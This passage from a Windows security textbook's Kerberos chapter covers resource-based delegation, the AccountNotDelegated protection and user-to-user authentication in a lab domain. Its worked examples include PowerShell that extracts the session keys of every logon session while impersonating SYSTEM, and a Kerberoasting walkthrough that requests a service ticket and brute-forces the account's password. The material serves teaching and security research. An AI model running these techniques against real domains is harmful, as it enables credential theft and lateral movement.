<p class="TNI1">The final constrained delegation type, resource-based delegation, was introduced in Windows Server 2012. It doesn’t change the underlying delegation process outlined previously; instead, it changes the condition under which a forwardable ticket gets issued for a service. Rather than basing this decision only on the account requesting the delegated ticket, it also considers the target SPN being requested.</p>
<p class="TX">The <samp class="SANS_TheSansMonoCd_W5Regular_11">msDS-AllowedToActOnBehalfOfOtherIdentity</samp> attribute on a user or computer object controls resource-based delegation. This attribute is a security descriptor that contains an ACE for every account the user can delegate to. You can set it using the <samp class="SANS_TheSansMonoCd_W5Regular_11">Set-ADUser</samp> or <samp class="SANS_TheSansMonoCd_W5Regular_11">Set-ADComputer</samp> PowerShell command by specifying distinguished names of the users or computers to the <samp class="SANS_TheSansMonoCd_W5Regular_11">PrincipalsAllowedToDelegateToAccount</samp> parameter. In <a href="chapter14.xhtml#Lis14-25">Listing 14-25</a>, we add the <i>GRAPHITE</i> computer account to the list of accounts to which the <i>alice</i> user can delegate.</p>
<span id="Lis14-25"></span><pre><code>PS&gt; <b>Set-ADUser -Identity alice</b>
<b>-PrincipalsAllowedToDelegateToAccount (Get-ADComputer GRAPHITE)</b>
PS&gt; <b>Get-ADUser -Identity alice -Properties </b>
<b>PrincipalsAllowedToDelegateToAccount |</b>
<b>Select-Object PrincipalsAllowedToDelegateToAccount</b>
PrincipalsAllowedToDelegateToAccount
------------------------------------
<span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> {CN=GRAPHITE,CN=Computers,DC=mineral,DC=com}
PS&gt; <b>$name = "msDS-AllowedToActOnBehalfOfOtherIdentity"</b>
PS&gt; <b>(Get-ADUser -Identity alice -Properties $name)[$name] |</b>
<b>ConvertTo-NtSecurityDescriptor | Format-NtSecurityDescriptor -Summary</b>
&lt;Owner&gt; : BUILTIN\Administrators
&lt;DACL&gt;
<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> MINERAL\GRAPHITE$: (Allowed)(None)(Full Access)
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-25: Setting resource-based delegation on a user account</span></p>
<p class="TX">This allows the <i>GRAPHITE</i> computer account to request a service ticket for one of the <i>alice</i> user’s SPNs. The <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-ADUser</samp> command exposes the full distinguished name of the target account <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>, but if we extract the security descriptor from the attribute and format it, we see the <i>MINERAL\GRAPHITE$</i> SID in an ACE in the formatted DACL <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>.</p>
<p class="TX">When transitioning from S4U2self to S4U2proxy, the client principal doesn’t need to have the <samp class="SANS_TheSansMonoCd_W5Regular_11">TrustedToAuthForDelegation</samp> flag set. As a mechanism of control, the domain controller provides two group SIDs that indicate the source of the token. <a href="chapter14.xhtml#tab14-2">Table 14-2</a> shows these two SIDs.</p>
<table class="Basic-Table1">
<caption><p class="TT" id="tab14-2"><span class="Heavy"><samp class="SANS_Futura_Std_Heavy_B_11">Table 14-2:</samp></span> <samp class="SANS_Futura_Std_Book_11">SIDs for Asserted Identities</samp></p></caption>
<thead>
<tr>
<th class="Basic-Table TCH" scope="col"><p class="TableHeader"><samp class="SANS_Futura_Std_Heavy_B_11">Name</samp></p></th>
<th class="Basic-Table TCH" scope="col"><p class="TableHeader"><samp class="SANS_Futura_Std_Heavy_B_11">SID</samp></p></th>
<th class="Basic-Table TCH" scope="col"><p class="TableHeader"><samp class="SANS_Futura_Std_Heavy_B_11">Description</samp></p></th>
</tr>
</thead>
<tbody>
<tr>
<td class="Basic-Table TBF"><p class="TableBody"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Authentication authority asserted identity</samp></p></td>
<td class="Basic-Table TBF"><p class="TableBody"><samp class="SANS_TheSansMonoCd_W5Regular_11">S-1-18-1</samp></p></td>
<td class="Basic-Table TBF"><p class="TableBody"><samp class="SANS_Futura_Std_Book_11">Token generated through authentication</samp></p></td>
</tr>
<tr>
<td class="Basic-Table TBL"><p class="TableBody"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Service asserted identity</samp></p></td>
<td class="Basic-Table TBL"><p class="TableBody"><samp class="SANS_TheSansMonoCd_W5Regular_11">S-1-18-2</samp></p></td>
<td class="Basic-Table TBL"><p class="TableBody"><samp class="SANS_Futura_Std_Book_11">Token generated through an S4U mechanism</samp></p></td>
</tr>
</tbody>
</table>
<p class="TX"><span aria-label=" Page 490. " epub:type="pagebreak" id="pg_490" role="doc-pagebreak"></span>The first SID indicates that the <samp class="SANS_TheSansMonoCd_W5Regular_11">Token</samp> object was generated by providing authentication credentials to the KDC. The second SID is assigned for S4U2self or S4U2proxy tokens. A security descriptor can use these SIDs to limit access to a service configured for resource delegation to either Kerberos-only delegation, which gets the first SID, or authentication protocol transition delegation, which gets the second.</p>
<p class="TX">Delegation is a dangerous feature if misconfigured, and it’s easy to misconfigure. This seems especially true for transitioning from S4U2self to S4U2proxy through constrained delegation, through which a service could impersonate any user in the domain, including privileged users. To reduce the danger of this occurring, the system can set the <samp class="SANS_TheSansMonoCd_W5Regular_11">AccountNotDelegated</samp> UAC flag to <samp class="SANS_TheSansMonoCd_W5Regular_11">True</samp> on an account to block it from being used in a delegation scenario. In the GUI, this flag is called “Account is sensitive and cannot be delegated.” You can set it on the domain controller using a domain administrator account by running the following PowerShell command:</p>
<pre><code>PS&gt; <b>Set-ADUser -Identity alice -AccountNotDelegated $true</b>
</code></pre>
<p class="TX">In <a href="chapter14.xhtml#Lis14-26">Listing 14-26</a>, we look at what this flag changes to prevent delegation.</p>
<span id="Lis14-26"></span><pre><code><span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> PS&gt; <b>Get-ADUser -Identity alice -Properties AccountNotDelegated |</b>
<b>Select-Object AccountNotDelegated</b>
AccountNotDelegated
-------------------
               True
PS&gt; <b>$client = New-LsaClientContext -CredHandle $credout -Target </b>
<b>"HTTP/graphite"</b>
PS&gt; <b>Unprotect-LsaAuthToken -Token $client.Token -Key $key | </b>
<b>Format-LsaAuthToken</b>
&lt;KerberosV5 KRB_AP_REQ&gt;
Options         : MutualAuthRequired
&lt;Ticket&gt;
Ticket Version  : 5
Server Name     : SRV_INST - HTTP/graphite
Realm           : MINERAL.LOCAL
<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> Flags           : Renewable, PreAuthent, EncPARep
<var>--snip--</var>
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-26: Inspecting ticket flags for an account with AccountNotDelegated set</span></p>
<p class="TX">First, we confirm that the <i>alice</i> user has the <samp class="SANS_TheSansMonoCd_W5Regular_11">AccountNotDelegated</samp> flag set to <samp class="SANS_TheSansMonoCd_W5Regular_11">True</samp> <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. We then request a service ticket for this user. By decrypting it, we can see that the <samp class="SANS_TheSansMonoCd_W5Regular_11">Forwardable</samp> flag is no longer present <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>. As explained earlier, the TGS will refuse to issue a new service ticket based on an existing service ticket if the <samp class="SANS_TheSansMonoCd_W5Regular_11">Forwardable</samp> flag is not set. This effectively blocks delegation automatically. Note that if the <samp class="SANS_TheSansMonoCd_W5Regular_11">Forwardable</samp> flag is set and you’ve just changed the value of the <samp class="SANS_TheSansMonoCd_W5Regular_11">AccountNotDelegated</samp> flag, I’d recommend logging out, then logging back in as the user to ensure the user has no tickets cached.</p>
<p class="TX">Until now, we’ve needed an SPN configured for a user or computer in order for the KDC to select the correct shared encryption key. An <span aria-label=" Page 491. " epub:type="pagebreak" id="pg_491" role="doc-pagebreak"></span>alternative authentication mode is also available that allows users to authenticate to each other without an SPN. Let’s finish the chapter by discussing how we can use Kerberos without configuring an SPN for a user.</p>
</section>
</section>
</section>
<section aria-labelledby="sec14" epub:type="division">
<h3 class="H1" id="sec14"><span id="h1-108"></span><samp class="SANS_Futura_Std_Bold_B_11">User-to-User Kerberos Authentication</samp></h3>
<p class="TNI1">The NTLM protocol can perform network authentication between unprivileged users, but because a Kerberos account needs a mapped SPN in order to grant a ticket, it shouldn’t normally be able to do this. To enable authentication between unprivileged users, Windows Kerberos includes a feature called <i>User-to-User (U2U) authentication</i>. <a href="chapter14.xhtml#fig14-11">Figure 14-11</a> shows the basic operations of U2U authentication.</p>
<figure class="IMG"><img alt="" class="img1" height="1063" id="fig14-11" src="../images/Figure14-11.jpg" width="1690"/>
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 14-11: User-to-user authentication with Kerberos</samp></p></figcaption>
</figure>
<p class="TX">In this figure, <i>alice</i> wants to authenticate to a service running under <i>bob</i>’s account. However, <i>bob</i> doesn’t have an SPN registered, so when <i>alice</i> makes a service ticket request <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>, it will fail, as the KDC doesn’t know the target SPN. But because the requested service name is in UPN format (that is, <samp class="SANS_TheSansMonoCd_W5Regular_11">bob@mineral.local</samp>), the LSA assumes that the user wants U2U authentication and instead generates a TGT-REQ message. It sends the TGT-REQ message to the service running under <i>bob</i>’s account <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>.</p>
<p class="TX">The service accepts the TGT-REQ token, and the LSA packages <i>bob</i>’s cached TGT into a TGT-REP message to send back to the client <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>. (Note that the LSA simply takes the caller’s cached TGT; it doesn’t seem to pay any <span aria-label=" Page 492. " epub:type="pagebreak" id="pg_492" role="doc-pagebreak"></span>attention to the UPN in the TGT-REQ. Therefore, the TGT returned might not be for the user requested, which will be important in the next step.)</p>
<p class="TX">Upon receipt of the TGT-REP, the LSA can package the TGT for <i>alice</i> and the TGT for <i>bob</i> into a TGS-REQ, then request a service ticket for <samp class="SANS_TheSansMonoCd_W5Regular_11">bob@mineral.local</samp> <span aria-label="annotation4" class="CodeAnnotationCode">❹</span>. The TGS can then decrypt the TGTs, verify that the extra TGT is for the requested user account, and generate a service ticket encrypted with the TGT session key for <i>bob</i>. If the extra TGT is not for <i>bob</i>, perhaps because the service was not running under <i>bob</i>’s account, the request will fail.</p>
<p class="TX">Assuming the request succeeds, the client’s LSASS can package up the service ticket into an AP-REQ message to send to the service and complete the authentication <span aria-label="annotation5" class="CodeAnnotationCode">❺</span>. Let’s run a test to see U2U authentication in operation (<a href="chapter14.xhtml#Lis14-27">Listing 14-27</a>).</p>
<span id="Lis14-27"></span><pre><code>PS&gt; <b>$credout = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Outbound</b>
<span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> PS&gt; <b>$client = New-LsaClientContext -CredHandle $credout -Target </b>
<b>bob@mineral.local</b>
PS&gt; <b>Format-LsaAuthToken -Token $client.Token</b>
<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> &lt;KerberosV5 KRB_TGT_REQ&gt;
Principal: bob@mineral.local
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-27: Initializing the U2U authentication client</span></p>
<p class="TX">First, we initialize the U2U client authentication context; note this should be running as the <i>alice</i> user. You should be familiar with most of this code by now; the only important difference is specifying <samp class="SANS_TheSansMonoCd_W5Regular_11">bob@mineral.local</samp> as the target SPN <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. When we format the authentication token, we see a TGT-REQ message containing the desired principal <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>. We now need the server authentication context to continue the authentication process (<a href="chapter14.xhtml#Lis14-28">Listing 14-28</a>).</p>
<span id="Lis14-28"></span><pre><code>PS&gt; <b>$credin = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Inbound</b>
<b>-ReadCredential</b>
UserName: bob
Domain: MINERAL
Password: <b>******</b>

PS&gt; <b>$server = New-LsaServerContext -CredHandle $credin</b>
PS&gt; <b>Update-LsaServerContext -Server $server -Client $client</b>
PS&gt; <b>Format-LsaAuthToken -Token $server.Token</b>
<span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> &lt;KerberosV5 KRB_TGT_REP&gt;
Ticket Version  : 5
Server Name     : SRV_INST - krbtgt/MINERAL.LOCAL
Realm           : MINERAL.LOCAL
Encryption Type : AES256_CTS_HMAC_SHA1_96
Key Version     : 2
Cipher Text     :
00000000: 98 84 C6 F4 B3 92 66 A7 50 6E 9B C2 AF 48 70 09
00000010: 76 E9 75 E8 D6 DE FF A5 A2 E9 6F 10 A9 1E 43 FE
<var>--snip--</var>
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-28: Creating the server authentication context and getting the TGT-REP</span></p>
<p class="TX"><span aria-label=" Page 493. " epub:type="pagebreak" id="pg_493" role="doc-pagebreak"></span>We first create the credentials handle and read the credentials for <i>bob</i> from the shell. It’s necessary to specify credentials for <i>bob</i> because otherwise the server authentication would use <i>alice</i>’s TGT, which would fail when creating the service ticket for the <samp class="SANS_TheSansMonoCd_W5Regular_11">bob@mineral.local</samp> SPN. With the credentials handle, we can create the server authentication context.</p>
<p class="TX">By formatting the returned authentication token, we can see it’s a TGT-REP with the TGT ticket <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. We don’t know the <i>krbtgt</i> user’s password, so we can’t decrypt it, meaning there’s no way of knowing whether the ticket is for <i>bob</i> or not. In <a href="chapter14.xhtml#Lis14-29">Listing 14-29</a>, we update the client authentication context with the TGT-REP message and print the new authentication token.</p>
<span id="Lis14-29"></span><pre><code>PS&gt; <b>Update-LsaClientContext -Client $client -Server $server</b>
PS&gt; <b>Format-LsaAuthToken -Token $client.Token</b>
<span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> &lt;KerberosV5 KRB_AP_REQ&gt;
<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> Options         : UseSessionKey
&lt;Ticket&gt;
Ticket Version  : 5
<span aria-label="annotation3" class="CodeAnnotationHang1">❸</span> Server Name     : PRINCIPAL - bob
Realm           : MINERAL.LOCAL
Encryption Type : AES256_CTS_HMAC_SHA1_96
Cipher Text     :
00000000: 26 3B A8 9D DA 13 74 9F DC 47 16 83 0C AB 4F FF
00000010: 75 A3 45 E4 16 6F D1 E9 DA FA 71 E2 26 DE 42 8C
<var>--snip--</var>
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-29: Continuing the U2U authentication</span></p>
<p class="TX">We can see that we now have our AP-REQ message to send to the server <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. It contains a ticket encrypted with <i>bob</i>’s session key <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>, and the target principal is <samp class="SANS_TheSansMonoCd_W5Regular_11">bob@mineral.local</samp> <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>. In <a href="chapter14.xhtml#Lis14-30">Listing 14-30</a>, we’re back on the server side.</p>
<span id="Lis14-30"></span><pre><code><span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> PS&gt; <b>Update-LsaServerContext -Server $server -Client $client</b>
PS&gt; <b>Use-NtObject($token = Get-LsaAccessToken $server) {</b>
    <b>Get-NtLogonSession $token | Format-Table</b>
<b>}</b>
LogonId           UserName       LogonType SessionId
-------           --------       --------- ---------
<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> 00000000-005CD2EF MINERAL\alice  Network   0
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-30: Completing U2U authentication</span></p>
<p class="TX">We complete the authentication <span aria-label="annotation1" class="CodeAnnotationCode">❶</span> and query the <samp class="SANS_TheSansMonoCd_W5Regular_11">Token</samp> object, which indicates a successful logon for <i>alice</i> <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>.</p>
</section>
<section aria-labelledby="sec15" epub:type="division">
<h3 class="H1" id="sec15"><span id="h1-109"></span><samp class="SANS_Futura_Std_Bold_B_11">Worked Examples</samp></h3>
<p class="TNI1">Let’s walk through some worked examples to demonstrate how you can use the various commands in this chapter to help with security research or systems analysis.</p>
<section aria-labelledby="sec16" epub:type="division">
<h4 class="H2" id="sec16"><span id="h2-157"></span><span aria-label=" Page 494. " epub:type="pagebreak" id="pg_494" role="doc-pagebreak"></span><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Querying the Kerberos Ticket Cache</samp></h4>
<p class="TNI1">The LSA maintains a cache of tickets requested using Kerberos for each logon session. You can query the current user’s ticket cache using the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-KerberosTicket</samp> command, as shown in <a href="chapter14.xhtml#Lis14-31">Listing 14-31</a>.</p>
<span id="Lis14-31"></span><pre><code><span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> PS&gt; <b>Get-KerberosTicket | Select-Object ServiceName, EndTime</b>
ServiceName                                           EndTime
-----------                                           -------
<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> SRV_INST - krbtgt/MINERAL.LOCAL                       3/19 6:12:15 AM
SRV_INST - LDAP/PRIMARYDC.mineral.local/mineral.local 3/19 6:12:15 AM

<span aria-label="annotation3" class="CodeAnnotationHang1">❸</span> PS&gt; <b>Get-KerberosTicket | Select-Object -First 1 | Format-KerberosTicket</b>
Ticket Version  : 5
Server Name     : SRV_INST - krbtgt/MINERAL.LOCAL
Realm           : MINERAL.LOCAL
Encryption Type : AES256_CTS_HMAC_SHA1_96
Key Version     : 2
Cipher Text     :
00000000: 10 F5 39 C5 E1 6D BB 59 E0 CF 04 61 F6 2D CF E2
00000010: 94 B3 88 46 DB 69 88 FF F4 F2 8B 52 AD 48 20 9C
00000020: 2D AE A4 02 4B 9E 75 F3 D0 05 23 63 70 31 E4 88
00000030: 4F 3E DD E7 23 DE 4B 7A 0D A9 47 62 90 6E 24 65
<var>--snip--</var>
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-31: Querying the Kerberos ticket cache</span></p>
<p class="TX">First, we query for the tickets <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>, selecting the fields <samp class="SANS_TheSansMonoCd_W5Regular_11">ServiceName</samp> (the ticket’s SPN) and <samp class="SANS_TheSansMonoCd_W5Regular_11">EndTime</samp> (the expiration time for the ticket, at which point it must be renewed). The first ticket in the cache is the user’s TGT, used for requesting service tickets <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>. In this example, we also have a service ticket for the LDAP directory server.</p>
<p class="TX">We can view a cached Kerberos ticket using the <samp class="SANS_TheSansMonoCd_W5Regular_11">Format-KerberosTicket</samp> command <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>, but the ticket is still encrypted, and as we probably don’t know the target service’s shared key we won’t be able to decrypt it. In theory, we could send the ticket to the destination service to authenticate to it directly. However, we don’t have the extracted session key needed to encrypt the authentication data in a valid AP-REQ either, so we’ll need to call the SSPI to generate the AP-REQ based on the cached ticket.</p>
<p class="TX">If you have <samp class="SANS_TheSansMonoCd_W5Regular_11">SeTcbPrivilege</samp> enabled, however, each ticket cache entry should contain the session key. <a href="chapter14.xhtml#Lis14-32">Listing 14-32</a> shows how to query for all tickets for all local logon sessions and extract the cached session key.</p>
<span id="Lis14-32"></span><pre><code>PS&gt; <b>$sess = Get-NtLogonSession</b>
PS&gt; <b>$tickets = Invoke-NtToken -System {Get-KerberosTicket -LogonSession $sess}</b>
PS&gt; <b>$tickets | Select-Object ServiceName, {Format-HexDump $_.SessionKey.Key}</b>
ServiceName                      Format-HexDump $_.SessionKey.Key
-----------                      --------------------------------
SRV_INST - krbtgt/MINERAL.LOCAL  EE 3D D2 F7 6F 5F 7E 06 B6 E2 4E 6C C6 36 59 64
<var>--snip--</var>
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-32: Extracting all tickets and session keys</span></p>
<p class="TX"><span aria-label=" Page 495. " epub:type="pagebreak" id="pg_495" role="doc-pagebreak"></span>We start by getting the list of logon sessions that can be passed to <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-KerberosTicket</samp>. We need to have <samp class="SANS_TheSansMonoCd_W5Regular_11">SeTcbPrivilege</samp> enabled to query for the tickets of any logon session except the caller’s, so we impersonate the <i>SYSTEM</i> user while querying the cache.</p>
<p class="TX">Impersonating <i>SYSTEM</i> also allows us to get the session key. We can format the key as hex along with the SPN of the cached ticket. With both the ticket and the session key, we can implement our own authentication request to the service.</p>
</section>
<section aria-labelledby="sec17" epub:type="division">
<h4 class="H2" id="sec17"><span id="h2-158"></span><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Simple Kerberoasting</samp></h4>
<p class="TNI1">One potential reason to interact with the ticket cache is to get a ticket for Kerberoasting, an attack described in the <span class="Xref">“Silver Tickets and Kerberoasting” box on page 465</span>. However, you don’t need to query the cache for this attack, as you can find all the information you need using the SSPI APIs. Let’s walk through a simple example so that you can understand how the Kerberoasting process works. First, in <a href="chapter14.xhtml#Lis14-33">Listing 14-33</a>, we query for all user accounts with configured SPNs.</p>
<span id="Lis14-33"></span><pre><code>PS&gt; <b>Get-ADUser -Filter {</b>
    <b>ObjectClass -eq 'user'</b>
<b>} -Properties ServicePrincipalName |</b>
<b>Where-Object ServicePrincipalName -ne $null |</b>
<b>Select SamAccountName, ServicePrincipalName</b>
SamAccountName ServicePrincipalName
-------------- --------------------
krbtgt         {kadmin/changepw}
alice          {HTTP/graphite}
sqlserver      {MSSQL/topaz.mineral.local}
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-33: Checking for users with configured SPNs</span></p>
<p class="TX">We see the <i>krbtgt</i> user, and that <i>alice</i> still has the <samp class="SANS_TheSansMonoCd_W5Regular_11">HTTP/graphite</samp> SPN we configured earlier in the chapter. We also see an account for a SQL server that has the SPN <samp class="SANS_TheSansMonoCd_W5Regular_11">MSSQL/topaz.mineral.local</samp>.</p>
<p class="TX">We don’t want to pick <i>krbtgt</i> as a target, as this account will have a complex password that will be difficult to brute-force (any computer account with an SPN configured also has an automatically configured complex password). We’ll try to brute-force the password for the <i>sqlserver</i> user. First we need to make a request for its SPN and receive the ticket (<a href="chapter14.xhtml#Lis14-34">Listing 14-34</a>).</p>
<span id="Lis14-34"></span><pre><code>PS&gt; <b>$creds = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Outbound</b>
PS&gt; <b>$client = New-LsaClientContext -CredHandle $creds</b>
<b>-Target "MSSQL/topaz.mineral.local"</b>
PS&gt; <b>Format-LsaAuthToken $client</b>
&lt;KerberosV5 KRB_AP_REQ&gt;
Options         : None
&lt;Ticket&gt;
Ticket Version  : 5
Server Name     : SRV_INST - MSSQL/topaz.mineral.local
Realm           : MINERAL.LOCAL
<span aria-label=" Page 496. " epub:type="pagebreak" id="pg_496" role="doc-pagebreak"></span>Encryption Type : ARCFOUR_HMAC_MD5
Key Version     : 2
Cipher Text     :
00000000: F3 23 A8 DB C3 64 BE 58 48 7A 4D E1 20 50 E7 B9
00000010: CB CA 17 59 A3 5C 0E 1D 6D 56 F9 B5 5C F5 EE 11
<var>--snip--</var>
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-34: Getting a service ticket for the</span> <samp class="SANS_Futura_Std_Book_11">sqlserver</samp> <span class="Futura_Std_Book_Oblique_I_11">user</span></p>
<p class="TX">Now that we have the ticket, we can generate a key based on a list of passwords. We can then try to decrypt the ticket with each key until we find a key that works, as illustrated in <a href="chapter14.xhtml#Lis14-35">Listing 14-35</a>.</p>
<span id="Lis14-35"></span><pre><code>PS&gt; <b>$pwds = "ABC!!!!", "SQLRUS", "DBPassw0rd"</b>
PS&gt; <b>foreach($pwd in $pwds) {</b>
    <b>$key = Get-KerberosKey -Password $pwd -KeyType ARCFOUR_HMAC_MD5</b>
<b>-NameType SRV_INST -Principal "MSSQL/topaz.mineral.local@mineral.local"</b>
    <b>$dec_token = Unprotect-LsaAuthToken -Key $key -Token $client.Token</b>
<b>  </b><span aria-label="annotation1" class="CodeAnnotationCode2">❶</span><b> if ($dec_token.Ticket.Decrypted) {</b>
        <b>Write-Host "Decrypted ticket with password: $pwd"</b>
        <b>break</b>
<b>    }</b>
<b>}</b>
Decrypted ticket with password: DBPassw0rd
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-35: Decrypting the ticket with a set of passwords</span></p>
<p class="TX">We can check if the ticket was decrypted by querying its <samp class="SANS_TheSansMonoCd_W5Regular_11">Decrypted</samp> property <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. If it was decrypted, we then print the password to the console. In this case, we find that the password for the <i>sqlserver</i> user is <samp class="SANS_TheSansMonoCd_W5Regular_11">DBPassw0rd</samp>— probably not the most secure option! Note that this example script isn’t very efficient or fast. It’s made easier by the ticket being encrypted with the RC4 encryption algorithm; you could apply the same technique to AES, but the brute-forcing attempt will take longer, as AES key derivation is more complex.</p>
<p class="TX">For better performance, you’re better off using another tool, such as Rubeus (<i><a href="https://github.com/GhostPack/Rubeus">https://<wbr/>github<wbr/>.com<wbr/>/GhostPack<wbr/>/Rubeus</a></i>), originally developed by Will Schroeder at SpecterOps. This tool can get the ticket and use it to generate a hash that you can feed to a fast password-cracking tool such as John the Ripper (<i><a href="https://www.openwall.com/john/">https://<wbr/>www<wbr/>.openwall<wbr/>.com<wbr/>/john<wbr/>/</a></i>).</p>
</section>
</section>
<section aria-labelledby="sec18" epub:type="division">
<h3 class="H1" id="sec18"><span id="h1-110"></span><samp class="SANS_Futura_Std_Bold_B_11">Wrapping Up</samp></h3>
<p class="TNI1">This chapter contained an in-depth discussion of Kerberos, the protocol used for Windows domain authentication since Windows 2000. We examined the key distribution center implemented on the Windows domain controller, which holds the list of keys associated with all users and computers on a network, and saw how Kerberos uses these keys (typically derived from the account password) to authenticate tickets, which can then authenticate to services on the network.</p>
<p class="TX"><span aria-label=" Page 497. " epub:type="pagebreak" id="pg_497" role="doc-pagebreak"></span>To support complex authentication scenarios, Kerberos allows for the delegation of credentials. We discussed this topic at length, including both constrained and unconstrained delegation as well as the associated Service for User mechanisms. We finished the chapter with a description of user-to-user authentication, which allows for two users to authenticate to each other without needing to register an SPN with the domain.</p>
<p class="TX">The next (and final) chapter will describe some additional network authentication protocols as well as going into more depth on how the SSPI APIs are used.</p>
</section>
</section>
</div></body>
</html>